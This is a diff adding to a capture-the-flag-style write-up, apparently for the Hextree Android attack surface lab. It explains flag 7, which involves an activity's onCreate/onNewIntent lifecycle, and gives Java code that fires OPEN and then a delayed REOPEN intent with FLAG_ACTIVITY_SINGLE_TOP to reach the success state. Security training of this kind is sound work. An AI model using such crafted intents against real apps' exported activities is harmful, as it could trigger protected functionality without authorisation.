@@ -156,10 +156,50 @@ Do exactly the same as in the flag5 to get to the `startactivity()` call, then a
 
 #### 7 - Activity lifecycle tricks
 
+on seeing the flag7activity code we see The [onNewIntent](https://developer.android.com/reference/android/app/Activity#onNewIntent%28android.content.Intent%29) method being used here means that when the activity is re-launched while at the top of the stack (so - the app can’t close) then `onNewIntent` will be called on the existing instance with the intent that was used to re-launch it.
 
+```java
+    public void onCreate(Bundle bundle) {
+        ...
+        if (action == null || !action.equals("OPEN")) {
+            return;
+        }
+        this.f.addTag("OPEN");
+    }
+    
+    public void onNewIntent(Intent intent) {
+		...
+        if (action == null || !action.equals("REOPEN")) {
+            return;
+        }
+        this.f.addTag("REOPEN");
+        success(this);
+    }
+```
 
+So we can implement the following code, which needed a slight delay to ensure that there was enough time to log and wait for the second request:
+
+```java
+public void onClick(View v){  
+    Intent intent = new Intent();  
+    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
+    intent.setAction("OPEN");  
+    startActivity(intent);  
+  
+    v.postDelayed(() -> {  
+        Intent intent2 = new Intent();  
+        intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
+        intent2.setAction("REOPEN");  
+        intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);  
+        startActivity(intent2);  
+    }, 100);  
+}
+```
 # Activity Result 
+
+Applications often use intents to reach out and trigger activities within other applications - often times there is a need for two-way communication to get the result of an activity being performed on another app.
 #### 8 - Do you expect a result?
+
 
 
 
